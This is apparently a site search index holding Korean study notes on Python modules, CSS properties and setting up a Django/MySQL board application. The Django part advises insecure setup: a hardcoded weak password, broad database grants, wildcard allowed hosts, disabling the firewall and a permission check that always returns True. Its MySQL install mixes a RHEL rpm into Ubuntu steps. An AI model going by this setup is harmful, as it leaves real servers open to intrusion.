함수는 입력으로 받은 리스트에서 무작위로 하나를 선택하여 돌려준다.\n리스트의 항목을 무작위로 섞고 싶을 때는 random.shuffle 함수를 사용하면 된다.\n   import random data = [1, 2, 3, 4, 5] random.shuffle(data) data [5, 1, 3, 4, 2]\n   [1, 2, 3, 4, 5] 리스트가 shuffle 함수에 의해 섞여서 [5, 1, 3, 4, 2]로 변한 것을 확인할 수 있다.\n  webbrowser webbrowser는 자신의 시스템에서 사용하는 기본 웹 브라우저를 자동으로 실행하는 모듈이다. 다음 예제는 웹 브라우저를 자동으로 실행하고 해당 URL인 google.com으로 가게 해 준다.\n   import webbrowser webbrowser.open(\u0026ldquo;http://google.com\u0026rdquo;) webbrowser의 open 함수는 웹 브라우저가 이미 실행된 상태라면 입력 주소로 이동한다. 만약 웹 브라우저가 실행되지 않은 상태라면 새로 웹 브라우저를 실행한 후 해당 주소로 이동한다.\n   open_new 함수는 이미 웹 브라우저가 실행된 상태이더라도 새로운 창으로 해당 주소가 열리게 한다.\n   webbrowser.open_new(\u0026ldquo;http://google.com\u0026rdquo;) [스레드를 다루는 threading 모듈]\n   스레드 프로그래밍은 초보 프로그래머가 구현하기에는 매우 어려운 기술이다. 여기에 잠시 소개했으니 눈으로만 살펴보고 넘어가자.\n컴퓨터에서 동작하고 있는 프로그램을 프로세스(Process)라고 한다. 보통 1개의 프로세스는 한 가지 일만 하지만 스레드(Thread)를 사용하면 한 프로세스 안에서 2가지 또는 그 이상의 일을 동시에 수행할 수 있다.\n간단한 예제로 설명을 대신하겠다.\nthread_test.py import time\ndef long_task(): # 5초의 시간이 걸리는 함수 for i in range(5): time.sleep(1) # 1초간 대기한다. print(\u0026ldquo;working:%s\\n\u0026rdquo; % i)\nprint(\u0026ldquo;Start\u0026rdquo;)\nfor i in range(5): # long_task를 5회 수행한다. long_task()\nprint(\u0026ldquo;End\u0026rdquo;) long_task 함수는 수행하는 데 5초의 시간이 걸리는 함수이다. 위 프로그램은 이 함수를 총 5번 반복해서 수행하는 프로그램이다. 이 프로그램은 5초가 5번 반복되니 총 25초의 시간이 걸린다.\n하지만 앞에서 설명했듯이 스레드를 사용하면 5초의 시간이 걸리는 long_task 함수를 동시에 실행할 수 있으니 시간을 줄일 수 있다.\n다음과 같이 프로그램을 수정해 보자.\nthread_test.py import time import threading # 스레드를 생성하기 위해서는 threading 모듈이 필요하다.\ndef long_task(): for i in range(5): time.sleep(1) print(\u0026ldquo;working:%s\\n\u0026rdquo; % i)\nprint(\u0026ldquo;Start\u0026rdquo;)\nthreads = [] for i in range(5): t = threading.Thread(target=long_task) # 스레드를 생성한다. threads.append(t)\nfor t in threads: t.start() # 스레드를 실행한다.\nprint(\u0026ldquo;End\u0026rdquo;) 이와 같이 프로그램을 수정하고 실행해 보면 25초 걸리던 작업이 5초 정도에 수행되는 것을 확인할 수 있다. threading.Thread를 사용하여 만든 스레드 객체가 동시 작업을 가능하게 해 주기 때문이다.\n하지만 위 프로그램을 실행해 보면 \u0026ldquo;Start\u0026quot;와 \u0026ldquo;End\u0026quot;가 먼저 출력되고 그 이후에 스레드의 결과가 출력되는 것을 확인할 수 있다. 그리고 프로그램이 정상 종료되지 않는다. 우리가 기대하는 것은 \u0026ldquo;Start\u0026quot;가 출력되고 그다음에 스레드의 결과가 출력된 후 마지막으로 \u0026ldquo;End\u0026quot;가 출력되는 것이다.\n이 문제를 해결하기 위해서는 다음과 같이 프로그램을 수정해야 한다.\nthread_test.py import time import threading\ndef long_task(): for i in range(5): time.sleep(1) print(\u0026ldquo;working:%s\\n\u0026rdquo; % i)\nprint(\u0026ldquo;Start\u0026rdquo;)\nthreads = [] for i in range(5): t = threading.Thread(target=long_task) threads.append(t)\nfor t in threads: t.start()\nfor t in threads: t.join() # join으로 스레드가 종료될때까지 기다린다.\nprint(\u0026ldquo;End\u0026rdquo;) 스레드의 join 함수는 해당 스레드가 종료될 때까지 기다리게 한다. 따라서 위와 같이 수정하면 우리가 원하던 출력을 보게 된다.\n"});index.add({'id':159,'href':'/docs/programing/web/css/','title':"C S S",'content':" #css\r태그 {\r스타일\r}\r*{\r}\r전체선택\r.클래스명{\r스타일\r}\r\u0026lt;h1 class=\u0026quot;클래스명\u0026quot;\u0026gt;\rid 선택자\r#아이디명{\r스타일\r}\r단위: em, ex, px, pt\rfont-family: \u0026lt;글꼴 이름[,\u0026lt;글꼴 이름\u0026gt;, \u0026lt;글꼴 이름\u0026gt;];\rfont-size: \u0026lt;절대 크기\u0026gt; | \u0026lt;상대 크기\u0026gt; | \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt;\rfont-weight: noraml | bold | bolder | lighter | 100 | 200 ...\rfont-variant: normal | small-caps\rfont-style: normal | italic | oblique\rfont: .....\r#text 스타일\rcolor: \u0026lt;색상\u0026gt;\rrgb(0,200,0). rgba(n,n,n,n), #0000ff, blue\rtext-decoration: none | underline | overline | line-through\rtext-transform: none | capitalize | uppercase | lowercase | full-width\rtext-shadow: none | \u0026lt;가로 거리\u0026gt; \u0026lt;세로 거리\u0026gt; \u0026lt;번짐 정도\u0026gt; \u0026lt;색상\u0026gt;\rwhite-space: normal | nowrap | pre | pre-line | pre-wrap\rletter-spacing: normal | \u0026lt;크기\u0026gt;\rword-spacing: normal | \u0026lt;크기\u0026gt;\r#문단 스타일\rdirection: ltr | rtl\rltr 왼쪽에서 오른쪽으로 표시\rrtl 오른쪽에서 왼쪽으로 표시\rtext-align: start | end | left | right | center | justtify | match-parent\rtext-justfy: auto | none | inter-word | distribute\rtext-indent: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; 들여쓰기\rtext-overflow: clip | ellipsis 너치는 텍스트를 자르기 | ...로 표시\rline-height: normal | \u0026lt;숫자\u0026gt; | \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | inherit 줄 간격 조절하기\r#리스트\rlist-style-type: 타입\rlist-style-image: url(\u0026lt;이미지\u0026gt;) | none\rlist-style-position: inside | outside 안쪽 들여쓰기 | 비깥 쪽 들여쓰기\r#색\rbackground-color:#000000\rbackground-clip: border-box | padding-box | content-box 박스 외곽까지 적용 | 테두리를 뺸 페딩까지 적용 | 내용부분에만 적용\rbackground-image: url('파일 경로')\rbackground-repeat: repeat | repeat-x | repeat-y | no-repeat 반복 | 가로로 반복 | 세로로 반복 | 반복 x\rbackground-size: auto | contain | cover | \u0026lt;크기 값\u0026gt; | \u0026lt;백분율\u0026gt; 원래 사이즈 | 다 표시되게 | 전체맞춤\rbackground-positon: \u0026lt;수평 위치\u0026gt; \u0026lt;수직 위치\u0026gt;\r수평 위치: left | center | right | \u0026lt;백분율\u0026gt; | \u0026lt;길이 값\u0026gt;\r수직 이치: top | center | bottom | \u0026lt;백분율\u0026gt; | \u0026lt;길이 값\u0026gt;\rbackground-origin: border-box | padding-box | content-box 박스 모델의 가장 외곽인 테두리가 기준 | 패딩 기준 | 내용이 기준\rbackground-attachment: scroll | fixed 화면 스크롤과 함께 배경이미지가 이동 | 이미지 고정\r#그라데이션\rlinear-gradient( \u0026lt;각도\u0026gt; to \u0026lt;방향\u0026gt;, color-stop, [color-stop,..])\rbackground:linear-gradient(to bottom, #06f, white 30%, #06f)\r방향 값: to top | to left | to right | to bottom\rradial-gradient( \u0026lt;최종 모양\u0026gt; \u0026lt;크기\u0026gt; at \u0026lt;위치\u0026gt;, color-stop, [color-stop..])\rbackground radial-gradient(cicrle at 10% 10%, white,blue) background: repeating-linear-gradient(yellow, yellow 20px, red 20px, red40px)\r#박스모델\rwidth: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rheight: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rdisplay: none | contents | block | inline | inline-block | table | table-cell\rborder:style: none | hidden | dashed | dotted | double | groove | inset | outset | ridge | solid\r테두리 없음 | 투명 | 점선 | 작은 점선 | 이중선 | 파인 홈 | n | n | n | 실선\rborder-top | right | bottom | left | width -width: \u0026lt;크기\u0026gt; | thin | medium | thick\rborder-radius-top | bottom-left | right-radius: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt;\rbox-shadow: none | \u0026lt;그림자 값\u0026gt; [, \u0026lt;그림자 값\u0026gt;]*\r\u0026lt;그림자 값\u0026gt; = \u0026lt;수평 거리\u0026gt; \u0026lt;수직 거리\u0026gt; \u0026lt;흐림 정도\u0026gt; \u0026lt;번짐 정도\u0026gt; \u0026lt;색상\u0026gt; inset\rmargin- top | right | bottom | left: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rmargin: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rpadding- top | right | bottom | left: \u0026lt;크기\u0026gt; | \u0026lt;백분율\u0026gt; | auto\rpadding: \u0026lt;크기\u0026gt; | \u0026lt;백문율\u0026gt; | auto\rhover{\r마우스가 올라가져 있을 때의 반응\r}\r "});index.add({'id':160,'href':'/docs/programing/web/django/basic/','title':"Basic",'content':"Django    Django   파이썬으로 만들어진 무료 오픈소스 웹 애플리케이션 프레임워크 모델\u0026ndash;뷰\u0026ndash;컨트롤러 ( MVC ) 패턴을 따름 장고는 컴포넌트의 재사용 및 플러그인화 가능성을, 빠른 개발을 위해 계발 웹 개발 시 많이 사용되며, 번거로운 요소들을 새로 개발할 필요 없이 내장된 기능만을 이용해 빠른 개발이 가능   MTV ( Model-Template-View )    Model\n 데이터에 관한 정보를 담으며, 데이터에 대한 접근, 검증, 작동과 데이터 사이의 관계를 정의하며, 각각의 모델은 데이터베이스에서 테이블에 해당    Template\n 데이터가 어떻게 표시되는 지를 정의, 템플릿은 사용자에게 실제로 보여지는 웹 페이지나 문서를 다룸    View\n 어떤 데이터가 표시될 것인지를 쟁의, 뷰는 HTTP 응답( response )를 반환해야 하며, 응답의 종류는 웹 페이지, 리디렉션, 문서 등 다양한 형태가 가능 뷰는 제네릭 뷰 ( generic view )라고 하며 원하는 재네릭 뷰를 상속한 클래스 뷰를 생성하여 사용할 수 있음        Django 프로젝트 기본 파일 구조  doc/ Project 포함 디렉토리 doc/ Project Root 디렉토리 __pycache__/ python3 Compile 디렉토리 __init__.py Python3 패키티 디렉토리 명시 파일 settings.py Django 프로젝트 파일 urls.py Django 프로젝트 URL 명시 파일 wsgi.py Djnago 웹 서비스 호환 파일 db.sqlite3 SQLite DB 파일 manage.py Django 프로젝트 실행 파일      Django 명령어   기본명령어 python manage.py [ 수행할 명령어 ]\r 웹 서버 작동\npython manage.py runserver [ 0.0.0.0:8000 ]  앱 생성\npython manage.py startapp [ 앱 이름 ]\r생성시 사용을 위해서는 settings.py의 INSTALLED_APPS에 등록해야됨\r Django DB 모델 변경사항 적용\npython manage.py migrate\r Django DB 모델 클래스 생성\npython manage.py inspectdb [ 테이블 명 ]\rpython manage.py inspectdb boards_v \u0026gt; testapp/models.py\r Django 관리자 계정 생성\npython manage.py createsuperuser\r DJnago 정적 파일배치\npython manage.py collectstatic\r/statc/의 정적파일을 배치한다.\r ㅁㅁ\npython manage.py  ㅁㅁ\npython manage.py "});index.add({'id':161,'href':'/docs/programing/web/django/django/','title':"Django",'content':"Djnago  Djnago 설치  설치환경   Ubuntu 18.04\n  mysql 5.7\n  python 3.6.8\n  pip3 9.0.3\n  django 2.1\n   Ubuntu 설정   apt update -y\n  apt upgrade -y\n  apt install python3 -y\n  apt install python3-pip -y\n  apt install gcc -y\n  apt install python-dev -y\n  apt install libmysqlclient-dev -y\n  apt install rpm -y\n    mysql 설치   wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm\n  rpm -ivh mysql57-community-release-el7-11.noarch.rpm\n  apt -y install mysql-server\n  systemctl start mysql\n   mysql 임시 비밀번호와 비밀번호 변경   임시 비밀번호 입력 후 변경할 비밀번호를 입력\n  cat /var/log/mysqld.log | grep root@localhost ( 임시 비밀번호가 나오지 않을 경우 엔터 입력 )\n  mysql_secure_installation\n  mysql -u root -p 비밀번호 입력\n   DB 사용을 위한 사용자 추가 mysql\u0026gt; create user \u0026#39;Django\u0026#39;@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;;\rmysql\u0026gt; grant all privileges on *.* to \u0026#39;Django\u0026#39;@\u0026#39;localhost\u0026#39;;\r한글 입력 출력 설정  mysql을 실행하여 아래와 같이 입력  mysql\u0026gt; show variables like \u0026#39;c%\u0026#39;;\r  몇몇 설정이 latin1으로 되어있는 것을 확인할 수있다.\n  테이블을 수정하면 일시적으로 한글 입력을 확인할 수 있다.\n  영구적으로 적용하기 위해 config파일을 수정할 필요가 있다.\n   /etc/mysql/mysql.conf.d/ 에 다음과 같은 파일들을 추가한다.  # client.cnf\r[client]\rdefault-character-set=utf8\r# mysqld.cnf [mysqld]\rcharacter-set-server=utf8\rcollation-server=utf8_general_ci\rinit_connect=SET collation_connection=utf8_general_ci\rinit_connect=SET NAMES utf8\r# mysqldump.cnf\r[mysqldump]\rdefault-character-set=utf8\r# mysql.cnf\r[mysql]\rdefault-character-set=utf8\r mysql 재시작 및 확인  systemctl restart mysql\rmysql -u root -p\rmysql\u0026gt; show variables like \u0026#39;c%\u0026#39;;\rmysql\u0026gt; status;\r  개발환경 설정   virtualenv 환경\npip3 install --user virtualenv\rsource .profile\r# root 사용자면 안됨 X 일반유저 프로파일\rvirtualenv ve\r virtualenv 활성화 비활성화\nsource ve/bin/activate\r# 활성화\r(ve) deactivate\r# 비활성화\r django 2.1 설치\n(ve) pip3 install django==2.1\r# ve가상환경에서 pip3 ( python3 )로 장고 설치\r virtualenv 환경에 설치된 목록 확인\n(ve) pip3 freeze # virtualenv 목록확인\r django에서 mysql을 사용하기위한 모듈 설치\n(ve) pip3 install mysqlclient\r 오류가 난다면 아래를 설치한 뒤 다시 시도한다.\napt install -y gcc\napt install -y python-devel mysql-devel\napt install -y python3-devel\r\r      Django Project  Django Project start  startproject (ve) django-admin startproject Django\r(ve) cd Django\r  테스트 서버 실행  ./manage.py runserver 0.0.0.0:8000\r  내부가 아닌 다른 곳에서 접속을 원하는 경우  vi Django/setting.py에서 ALLOWED_HOSTS = ['*']로 편집해준다. 방화벽을 해제한다.      설정파일 settings.py   settings.py는 파일 장고의 전반적인 설정을 다룬다. 시간과 언어를 바꿔준다.  LANGUAGE_CODE = \u0026#39;en-us\u0026#39;\r--\u0026gt; LANGUAGE_CODE = \u0026#39;ko-kr\u0026#39; TIME_ZONE = \u0026#39;UTC\u0026#39;\r--\u0026gt; \u0026#39;Asia/Seoul\u0026#39;\rUSE_I18N = True\rUSE_L10N = True\rUSE_TZ = True\rSTATIC_URL = \u0026#39;/static/\u0026#39;\r DB 연동을 위해 설정 값을 입력한다.\nDATABASES = {\r\u0026#39;default\u0026#39;: {\r\u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;,\r\u0026#39;NAME\u0026#39;: \u0026#39;DjangoDB\u0026#39;, # DB 명을 입력한다.\r \u0026#39;USER\u0026#39;: \u0026#39;root\u0026#39;, # SQL 유저의 이름을 입력한다.\r \u0026#39;PASSWORD\u0026#39;: \u0026#39;qwer1234\u0026#39;, # 유저 패스워드를 입력한다.\r \u0026#39;PORT\u0026#39;: \u0026#39;3306\u0026#39;,\r\u0026#39;HOST\u0026#39;: \u0026#39;localhost\u0026#39;,\r\u0026#39;OPTIONS\u0026#39;: {\r\u0026#39;init_command\u0026#39;: \u0026#34;SET sql_mode=\u0026#39;STRICT_TRANS_TABLES\u0026#39;\u0026#34;,\r},\r}\r}\rDB 연동을 위해 DB를 생선한다.\n 슈퍼 계정 생성\nmysql\u0026gt;\r확인\n./manage.py runserver 0.0.0.0:8000\rmysql 연동 확인 mysql -u Django -p\n"});index.add({'id':162,'href':'/docs/programing/web/django/test/','title':"Test",'content':"Django Project   Django Boardapp project  모델을 구성하기에 앞서 django에서 지원하는 admin을 사용하기 위해 기본적인 database를 받아온다.\n(ve) $ ./manage.py migrate\r DB 테이블 생성\n# User table\rALTER TABLE auth_user\rADD COLUMN phone VARCHAR(45) NOT NULL AFTER date_joined,\rADD COLUMN date_of_birth DATETIME NOT NULL AFTER phone,\rCHANGE COLUMN date_joined date_joined DATETIME NOT NULL AFTER email,\rCHANGE COLUMN first_name first_name VARCHAR(30) NULL AFTER is_active,\rCHANGE COLUMN is_staff is_staff TINYINT(1) NULL,\rCHANGE COLUMN is_active is_active TINYINT(1) NULL;\r# Board table\r## board_categories\rcreate table board_categories(\rid int(10) not null auto_increment,\rcategory_type varchar(45) not null default \u0026#39;Normal\u0026#39;,\rcategory_code varchar(100) not null,\rcategory_name varchar(100) not null,\rcategory_desc varchar(200) not null,\rlist_count int(10) default \u0026#39;20\u0026#39;,\rauthority int(1) default \u0026#39;0\u0026#39;,\rcreation_date datetime default current_timestamp,\rlast_update_date datetime default null,\rprimary key(id)\r)engine=InnoDB default CHARSET=utf8;\r## boards\rcreate table boards(\rid int(10) not null auto_increment,\rcategory_id int(10) not null,\ruser_id int(10) not null,\rtitle varchar(300) not null,\rcontent text not null,\rregistered_date datetime default current_timestamp,\rlast_update_date datetime default null,\rview_count int(10) default \u0026#39;0\u0026#39;,\rimage varchar(255) default null,\rprimary key(id),\rkey board_category_fk_idx(category_id),\rkey board_user_fk_idx(user_id),\rconstraint board_category_fk foreign key(category_id) references board_categories(id) on delete no action on update no action,\rconstraint board_user_fk foreign key(user_id) references auth_user(id) on delete no action on update no action\r)engine=InnoDB default CHARSET=utf8;\r## board_replies\rcreate table board_replies(\rid int(10) not null auto_increment,\rarticle_id int(10) not null,\ruser_id int(10) not null,\r`level` tinyint(1) default \u0026#39;1\u0026#39;,\rcontent text not null,\rreference_reply_id int(10) default \u0026#39;0\u0026#39;,\rregistered_date datetime default current_timestamp,\rlast_update_date datetime default null,\rprimary key(id),\rkey user_reply_fk_idx(user_id),\rkey article_reply_fk_idx(article_id),\rconstraint article_reply_fk foreign key(article_id) references boards(id) on delete no action on update no action,\rconstraint user_reply_fk foreign key(user_id) references auth_user(id) on delete no action on update no action\r)engine=InnoDB default CHARSET=utf8;\r## board_likes\rcreate table board_likes(\rid int(10) not null auto_increment,\rarticle_id int(10) not null,\ruser_id int(11) not null,\rregistered_date datetime default current_timestamp,\rprimary key(id),\rkey like_article_fk_idx(article_id),\rkey like_user_fk_idx(user_id),\rconstraint like_article_fk foreign key(article_id) references boards(id) on delete no action on update no action,\rconstraint like_user_fk foreign key(user_id) references auth_user(id) on delete no action on update no action\r)engine=InnoDB default CHARSET=utf8;\rpip3 install Pillow\n어플리케이션 생성 및 settings.py 수정\n(ve) $ ./manage.py startapp boardapp\r(ve) $ vi Django/setting.py\rINSTALLE_APPS에 생성한 어플리케이션을 등록한다.\nINSTALLED_APPS = [\r...\r...\r\u0026#39;django.contrib.messages\u0026#39;,\r\u0026#39;django.contrib.staticfiles\u0026#39;,\r\u0026#39;boardapp.apps.BoardappConfig\u0026#39;,\r]\rAUTH_USER_MODEL = \u0026lsquo;boardapp.user\u0026rsquo;\n   MTV 패턴 Models 구성   models   boardapp에서 사용할 table을 만들었으니 model에 추가 기본적인 틀 생성을 위해 inspectdb를 사용  (ve) $ ./manage.py inspectdb \u0026gt; boardapp/models.py\r 받아온 모델을 앞으로 사용할 모델에 적합하게 수정  from django.contrib.auth.models import AbstractBaseUser,BaseUserManager,PermissionsMixin\rfrom django.db import models\rfrom django.utils import timezone\rclass UserManager(BaseUserManager):\rdef create_user(self,\rusername,\rpassword,\rlast_name,\remail,\rphone,\rdate_of_birth):\ruser = self.model(\rusername=username,\rlast_name=last_name,\remail=self.normalize_email(email),\rphone=phone,\rdate_of_birth=date_of_birth,\rdate_joined=timezone.now(),\ris_superuser=0,\ris_staff=0,\ris_active=1\r)\ruser.set_password(password)\ruser.save(using=self._db)\rreturn user\rdef create_superuser(self,\rusername,\rlast_name,\remail,\rphone,\rdate_of_birth,\rpassword):\ruser = self.create_user(\rusername=username,\rpassword=password,\rlast_name=last_name,\remail=email,\rphone=phone,\rdate_of_birth=date_of_birth\r)\ruser.is_superuser = 1\ruser.is_staff = 1\ruser.save(using=self._db)\rreturn user\rclass User(AbstractBaseUser, PermissionsMixin):\rpassword = models.CharField(max_length=128)\rusername = models.CharField(unique=True, max_length=150)\ris_superuser = models.IntegerField()\rlast_name = models.CharField(max_length=150)\rphone = models.CharField(max_length=45)\remail = models.CharField(max_length=254)\rdate_of_birth = models.DateTimeField()\rdate_joined = models.DateTimeField()\rlast_login = models.DateTimeField(blank=True, null=True)\ris_staff = models.IntegerField(blank=True, null=True)\ris_active = models.IntegerField(blank=True, null=True)\rfirst_name = models.CharField(max_length=30, blank=True, null=True)\robjects = UserManager()\rUSERNAME_FIELD = \u0026#39;username\u0026#39;\rREQUIRED_FIELD = [\u0026#39;last_name\u0026#39;, \u0026#39;phone\u0026#39;, \u0026#39;email\u0026#39;, \u0026#39;date_of_birth\u0026#39;]\rdef has_perm(self, perm, obj=None):\rreturn True\rdef has_module_perms(self, app_lable):\rreturn True\rclass Meta:\rdb_table = \u0026#39;auth_user\u0026#39;\rclass BoardCategories(models.Model):\rcategory_type = models.CharField(max_length=45)\rcategory_code = models.CharField(max_length=100)\rcategory_name = models.CharField(max_length=100)\rcategory_desc = models.CharField(max_length=200)\rlist_count = models.IntegerField(blank=True, null=True)\rauthority = models.IntegerField(blank=True, null=True)\rcreation_date = models.DateTimeField(default=timezone.now)\rlast_update_date = models.DateTimeField(default=timezone.now)\rdef __str__(self):\rreturn \u0026#39;%s(%s)\u0026#39; % (self.category_name, self.category_code)\rclass Meta:\rmanaged = False\rdb_table = \u0026#39;board_categories\u0026#39;\rclass Boards(models.Model):\rcategory = models.ForeignKey(BoardCategories, models.DO_NOTHING)\ruser = models.ForeignKey(User, models.DO_NOTHING)\rtitle = models.CharField(max_length=300)\rcontent = models.TextField()\rregistered_date = models.DateTimeField(default=timezone.now)\rlast_update_date = models.DateTimeField(default=timezone.now)\rview_count = models.IntegerField(blank=True, default=0)\rimage = models.ImageField(upload_to=\u0026#34;images/%Y/%m/%d\u0026#34;, blank=True)\rdef __str__(self):\rreturn \u0026#39;[%d] %.40s\u0026#39; % (self.id, self.title)\rclass Meta:\rmanaged = False\rdb_table = \u0026#39;boards\u0026#39;\rclass BoardReplies(models.Model):\rarticle = models.ForeignKey(Boards, models.DO_NOTHING)\ruser = models.ForeignKey(User, models.DO_NOTHING)\rlevel = models.IntegerField(blank=True, null=True)\rcontent = models.TextField()\rreference_reply_id = models.IntegerField(blank=True, null=True)\rregistered_date = models.DateTimeField(default=timezone.now)\rlast_update_date = models.DateTimeField(default=timezone.now)\rdef __str__(self):\rreturn \u0026#39;[%d] %.40s- [%d] %.40s\u0026#39; % (self.article.id, self.article.title, self.id, self.content)\rclass Meta:\rmanaged = False\rdb_table = \u0026#39;board_replies\u0026#39;\rclass BoardLikes(models.Model):\rarticle = models.ForeignKey(Boards, models.DO_NOTHING)\ruser = models.ForeignKey(User, models.DO_NOTHING)\rregistered_date = models.DateTimeField(default=timezone.now)\rdef __str__(self):\rreturn \u0026#39;[%d] %.40s- %s\u0026#39; % (self.article.id, self.article.title, self.user.last_name)\rclass Meta:\rmanaged = False\rdb_table = \u0026#39;board_likes\u0026#39;\r  Djnago 어플리케이션 흐름  urls.py에 등록되어 있는 url을 따라간다. urls.py에 특정 url에 접근 했을 때 동작할 행동을 지정 지정한 동작을 views.py에 def, class로 만들어 행동을 이행 필요하다면 models.py에 접근하여 만들어 놓은 모델을 사용  urls.py 작성\nfrom django.conf.urls.static import static\rfrom django.conf import settings\rfrom django.contrib import admin\rfrom django.urls import include, path\rurlpatterns = [\rpath(\u0026#39;admin/\u0026#39;, admin.site.urls),\rpath(\u0026#39;boardapp/\u0026#39;, include(\u0026#39;boardapp.urls\u0026#39;)),\r]\rurlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)\r boardapp/urls.py\nfrom django.conf.urls.static import static\rfrom django.conf import settings\rfrom django.urls import path\rfrom django.contrib.auth import views as auth_views\rfrom boardapp.views import *\rurlpatterns = [\rpath(\u0026#39;\u0026#39;, main_page, name=\u0026#39;main\u0026#39;),\r]\rurlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)\rboardapp/views.py에 앞으로 사용될 모듈을 모두 import 시켜둔다\nfrom django.shortcuts import render, redirect\rfrom django.http import HttpResponse, HttpResponseRedirect, JsonResponse\rfrom boardapp.models import *\rfrom datetime import datetime\rfrom django.utils import timezone\rimport math\rfrom django.db.models import Count\rfrom django.core.paginator import Paginator\rfrom django.contrib.auth.decorators import login_required\rfrom django.views.generic import DetailView\rdef main_page(request):\rreturn HttpResponse(\u0026#34;\u0026lt;h2\u0026gt;hi\u0026lt;/h2\u0026gt;\u0026#34;)\rhi 라는 문자가 확인이 가능해진다\ntemplate를 사용하여 Page를 보이게 한다\n$ vi boardapp/views.py\rdef main_page(request):\rreturn render(request, \u0026#39;main.html\u0026#39;)\radmin 페이지에 djnago 에서 지원하는 페이지를 상속받아 사용\nvi boardapp/admin.py\rfrom django.contrib import admin\rfrom boardapp.models import *\radmin.site.register(Boards)\radmin.site.register(BoardCategories)\radmin.site.register(BoardReplies)\radmin.site.register(BoardLikes)\rstatic, media 지정\n각각의 파일의 위치를 settings.py에서 지정\nSTATIC_URL = \u0026#39;/static/\u0026#39;\rSTATIC_ROOT = os.path.join(BASE_DIR, \u0026#39;static\u0026#39;)\rMEDIA_URL = \u0026#39;/media/\u0026#39;\rMEDIA_ROOT = os.path.join(BASE_DIR, \u0026#39;media\u0026#39;).replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;)\r흩어져있는 static 파일을 지정한 URL로 복사한다.\n(ve) $ ./manage.py collectstatic\rrunserver 확인\nboard/templates 디렉토리를 생성\nmain.html을 생성\n\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;utf8\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;타이틀\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1\u0026gt;template로 작성되었습니다.\u0026lt;/h1\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r확인\n마이그레이트 boardapp\n\u0026ndash;\u0026gt; 마이그레이트\n 거의 모든 templates의 틀이 되는 base.html 생성  base.html main 페이지 작성 vi boardapp/templates/base.html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;KO\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;title\u0026gt;{% block title %}AWS / Django Web Application{% endblock %}\u0026lt;/title\u0026gt;\r\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt;\r\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt;\r{% load static %}\r\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{% static \u0026#39;boardapp/assets/css/bootstrap.min.css\u0026#39; %}\u0026#34;/\u0026gt;\r\u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;{% static \u0026#39;boardapp/assets/css/main.css\u0026#39; %}\u0026#34;/\u0026gt;\r\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/jquery-3.3.1.min.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\r\u0026lt;script src=\u0026#34;{% static \u0026#39;boardapp/assets/js/bootstrap.min.js\u0026#39; %}\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {% block script %}{% endblock %}\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;div id=\u0026#34;header\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;logo\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;row bg-dark\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-8 logo-link dark-link\u0026#34;\u0026gt;\r\u0026lt;a href=\u0026#34;{% url \u0026#39;main\u0026#39; %}\u0026#34;\u0026gt;AWS / Django Web Application\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;col-4 center member-link dark-link bg-black\u0026#34;\u0026gt;\r{% if user.username %}\r\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;{{ user.last_name }} 님\u0026lt;/a\u0026gt; /\r\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;로그아웃\u0026lt;/a\u0026gt;\r{% else %}\r\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;로그인\u0026lt;/a\u0026gt; /\r\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;회원가입\u0026lt;/a\u0026gt;\r{% endif %}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;menu\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;row bg-dark\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt;\r\u0026lt;a href=\u0026#34;{% url \u0026#39;main\u0026#39; %}\u0026#34;\u0026gt;HOME\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt;\r\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;소개\u0026lt;/a\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;col-2 center sideline dark-link\u0026#34;\u0026gt;\r\u0026lt;a 